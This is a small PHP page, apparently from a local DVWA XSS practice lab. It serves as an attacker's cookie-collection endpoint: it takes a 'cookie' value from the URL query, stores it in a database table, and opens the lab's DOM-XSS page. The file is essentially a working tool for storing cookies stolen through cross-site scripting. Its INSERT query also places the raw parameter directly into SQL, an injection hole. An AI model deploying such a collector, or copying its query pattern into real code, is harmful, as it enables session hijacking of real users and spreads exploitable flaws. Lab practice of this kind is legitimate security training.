<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

    <?php


    //server
    include "C:\\xampp\\htdocs\\3.dvwa\\0.db_info.php";

    $k=0;
    if( isset( $_GET[ 'cookie' ] ) ) {
        $cookie=$_GET[ 'cookie' ];
        $query = "insert into cookie (cookie) values ('$cookie');";

        $result = mysqli_query($con, $query) ;
        $k=1;
    }
    if($k==1) {
        echo "<script>window.open('http://localhost/3.dvwa/9.XSS%20(DOM)/9-1.XSS%20(DOM).php');</script>";
    }
    ?>


</head>


<body class="home">
<div id="container">

    <div id="main_body">
        <form action="#" method="GET">
            <input type="hidden" name='cookie'>
        </form>



</body>

</html>
